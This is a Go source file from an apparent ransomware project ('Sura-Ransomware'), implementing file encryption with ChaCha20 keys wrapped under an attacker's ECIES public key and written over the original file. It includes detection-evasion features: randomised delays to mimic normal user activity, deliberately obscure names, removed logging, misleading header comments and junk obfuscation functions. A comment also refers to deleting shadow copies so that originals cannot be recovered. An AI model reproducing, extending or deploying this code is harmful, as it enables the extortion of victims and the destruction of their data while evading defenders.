// OBFUSCATED
// Windows compatibility layer
// Memory management system
package encryption

import (
	Configuration "Sura-Ransomware/configuration"
	cryptorand "crypto/rand"
	"encoding/base64"
	"io"
	"math/rand"
	"os"
	"time"

	eciesgo "github.com/ecies/go"
	"golang.org/x/crypto/chacha20"
)

const (
	sep = "||" // Separator
)

var (
	pk  *eciesgo.PublicKey
	err error
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func init() {
	pk, err = eciesgo.NewPublicKeyFromHex(Configuration.PublicKey)
	if err != nil {
		panic(err)
	}
	rand.Seed(time.Now().UnixNano())
}

// Obfuscated function names
func genK() ([]byte, error) {
	key := make([]byte, chacha20.KeySize)
	if _, err := cryptorand.Read(key); err != nil {
		return nil, err
	}
	return key, nil
}

func genN() ([]byte, error) {
	nonce := make([]byte, chacha20.NonceSizeX)
	if _, err := cryptorand.Read(nonce); err != nil {
		return nil, err
	}
	return nonce, nil
}

// Simulate normal file operation timing
func simulateUserDelay() {
	if Configuration.SimulateNormalActivity {
		// Random delay between 100ms and 2s to mimic user file operations
		delay := 100 + rand.Intn(1900)
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
}

// Renamed to be less obvious
func ProcessFile(filePath string) {
	// Add random delay before processing to look like normal activity
	simulateUserDelay()

	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	// NOTE: Secure overwrite is NOT used here because it would make files
	// unrecoverable even with the decryption key. Strong encryption is enough.
	// Shadow copy deletion prevents recovery of unencrypted originals.

	// Generate the key and nonce
	key, err := genK()
	if err != nil {
		return
	}

	nonce, err := genN()
	if err != nil {
		return
	}

	// Encrypt the key and nonce using RSA
	encryptedKey, err := eciesgo.Encrypt(pk, key)
	if err != nil {
		return
	}

	encryptedNonce, err := eciesgo.Encrypt(pk, nonce)
	if err != nil {
		return
	}

	// Create the cipher for ChaCha20 encryption
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return
	}

	buffer := make([]byte, Configuration.ChunkSize)

	// Read and encrypt the file content
	var fileContent []byte
	for {
		n, err := file.Read(buffer)
		if err != nil && err != io.EOF {
			return
		}

		if n == 0 {
			break
		}

		fileContent = append(fileContent, buffer[:n]...)
	}

	ciphertext := make([]byte, len(fileContent))
	for i := 0; i < len(fileContent); i += Configuration.EncryptEveryNthByte {
		if i < len(fileContent) {
			cipher.XORKeyStream(ciphertext[i:i+1], fileContent[i:i+1])
		}
		if i+1 < len(fileContent) {
			ciphertext[i+1] = fileContent[i+1]
		}
		if i+2 < len(fileContent) {
			ciphertext[i+2] = fileContent[i+2]
		}
	}

	// Prepare the final data to write to the file
	finalData := append(encryptedKey, sep...)
	finalData = append(finalData, encryptedNonce...)
	finalData = append(finalData, sep...)
	finalData = append(finalData, ciphertext...)

	// Write the final data back to the file
	if err = file.Truncate(0); err != nil {
		return
	}

	if _, err = file.Seek(0, io.SeekStart); err != nil {
		return
	}

	if _, err = file.Write(finalData); err != nil {
		return
	}

	// Removed logging to reduce detection
}



// Obfuscation padding
func obf_66868() {
    _ = 7709
    var _ = "FpIls1xOz6vq0tvXuNPi2AuzcXjJyftXFwr1i4usDTsRrT19vh"
}


// Obfuscation padding
func obf_40409() {
    _ = 8833
    var _ = "yjkKqRIksqjWrd0TiYRP5skD9Zsw4xq49Qw7IRo9RlmvVSyb4P"
}


// Obfuscation padding
func obf_18994() {
    _ = 2936
    var _ = "bUk39Ec16ru3U4NTt6SNmJrfl6OPKNtB9hEMNKmHApjUqgtkxW"
}


// Obfuscation padding
func obf_98851() {
    _ = 4597
    var _ = "KdbGAcvbsLpdDGvn7tbryehrOXV1ysYsnXeQsKlWbtDfMRMqOL"
}


// Obfuscation padding
func obf_58120() {
    _ = 1919
    var _ = "L6VUSMh4gzTnYoLJ6ccYt5xmn1OPbSCjovhK1A7chOORDbFDBu"
}
